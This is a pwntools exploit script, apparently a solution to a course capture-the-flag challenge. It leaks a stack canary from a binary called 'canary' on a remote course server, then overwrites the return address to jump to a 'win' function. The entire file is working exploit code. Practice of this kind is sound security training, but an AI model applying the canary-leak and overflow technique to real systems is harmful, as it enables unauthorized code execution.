#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template bird
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('canary')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote('cs412.polygl0ts.ch', 9002)
        # return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# p = exe.process()
# g = gdb.attach(p)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.sendlineafter(b'Your command: ', b' 0')
io.sendlineafter(b'Tell me which slot you wanna read: ', b'13')

canaryy = u64(io.recv(8))
print(canaryy)

win = exe.symbols["win"]
payload = b'A' * 104 + p64(canaryy) + b'A' * 8 + p64(win)
print(payload)

io.sendlineafter(b'Your command: ', b' 1')

io.sendlineafter(b'Tell me how much you wanna write: ', b'128')
io.sendlineafter(b'What are the contents (max 8 bytes): ', payload)
io.sendlineafter(b'Your command: ', b' 2')

io.interactive()

